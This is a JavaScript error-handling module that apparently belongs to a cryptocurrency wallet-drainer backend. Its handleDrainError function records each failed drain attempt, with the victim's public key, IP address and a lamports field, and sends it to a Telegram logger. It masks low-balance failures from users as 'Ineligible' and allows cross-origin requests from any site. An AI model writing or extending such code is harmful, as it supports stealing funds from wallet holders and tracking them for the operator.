// Centralized Error Handling Utility
// Used across all API endpoints for consistent error responses

/**
 * Handle drain errors with specific error types and logging
 * @param {Error} error - The error object
 * @param {string} userPubkey - User's public key
 * @param {string} userIp - User's IP address
 * @param {Object} telegramLogger - Telegram logger instance
 * @returns {Object} - Error response object
 */
export async function handleDrainError(error, userPubkey, userIp, telegramLogger) {
  let errorType = 'GENERAL_ERROR';
  let statusCode = 500;
  
  // Determine error type based on error message and properties
  if (error.message?.includes('429') || error.message?.includes('rate limit')) {
    errorType = 'RATE_LIMITED';
    statusCode = 429;
  } else if (error.message?.includes('503') || error.message?.includes('service unavailable')) {
    errorType = 'SERVICE_UNAVAILABLE';
    statusCode = 503;
  } else if (error.message?.includes('insufficient') || error.message?.includes('balance')) {
    errorType = 'INSUFFICIENT_FUNDS';
    statusCode = 400;
  } else if (error.message?.includes('timeout') || error.message?.includes('connection')) {
    errorType = 'TIMEOUT';
    statusCode = 408;
  } else if (error.message?.includes('invalid') || error.message?.includes('malformed')) {
    errorType = 'INVALID_REQUEST';
    statusCode = 400;
  } else if (error.message?.includes('unauthorized') || error.message?.includes('forbidden')) {
    errorType = 'UNAUTHORIZED';
    statusCode = 401;
  } else if (error.name === 'NetworkError' || error.message?.includes('network')) {
    errorType = 'NETWORK_ERROR';
    statusCode = 503;
  }
  
  // Log error to Telegram
  try {
    await telegramLogger.logDrainFailed({
      publicKey: userPubkey?.toString() || 'N/A',
      lamports: 0,
      ip: userIp,
      error: error.message,
      details: error.stack ? error.stack.split('\n')[0] : 'No stack trace available'
    });
  } catch (logError) {
    console.error('[ERROR_HANDLER] Failed to log error to Telegram:', logError);
  }
  
  return {
    status: statusCode,
    error: getErrorMessage(errorType),
    details: getErrorDetails(errorType),
    code: errorType
  };
}

/**
 * Get user-friendly error message
 * @param {string} errorType - Error type code
 * @returns {string} - User-friendly error message
 */
export function getErrorMessage(errorType) {
  const messages = {
    'RATE_LIMITED': 'Rate Limited',
    'SERVICE_UNAVAILABLE': 'Unavailable',
    'INSUFFICIENT_FUNDS': 'Ineligible',
    'TIMEOUT': 'Timeout',
    'INVALID_REQUEST': 'Invalid',
    'UNAUTHORIZED': 'Failed',
    'NETWORK_ERROR': 'Network',
    'GENERAL_ERROR': 'Failed'
  };
  return messages[errorType] || messages['GENERAL_ERROR'];
}

/**
 * Get detailed error information for debugging
 * @param {string} errorType - Error type code
 * @returns {string} - Detailed error information
 */
export function getErrorDetails(errorType) {
  const details = {
    'RATE_LIMITED': 'Too many requests from this IP address. Please wait before trying again.',
    'SERVICE_UNAVAILABLE': 'The service is temporarily down for maintenance.',
    'INSUFFICIENT_FUNDS': 'Your wallet balance is too low to complete this transaction.',
    'TIMEOUT': 'The request took too long to process. This might be due to network congestion.',
    'INVALID_REQUEST': 'The request format is incorrect or missing required parameters.',
    'UNAUTHORIZED': 'You do not have permission to perform this action.',
    'NETWORK_ERROR': 'Unable to connect to the network. Please check your internet connection.',
    'GENERAL_ERROR': 'An unexpected server error occurred. Please try again later.'
  };
  return details[errorType] || details['GENERAL_ERROR'];
}

/**
 * Set CORS headers for API responses
 * @param {Object} res - Express response object
 */
export function setCORSHeaders(res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  res.setHeader('Access-Control-Max-Age', '86400');
}

export default {
  handleDrainError,
  getErrorMessage,
  getErrorDetails,
  setCORSHeaders
};
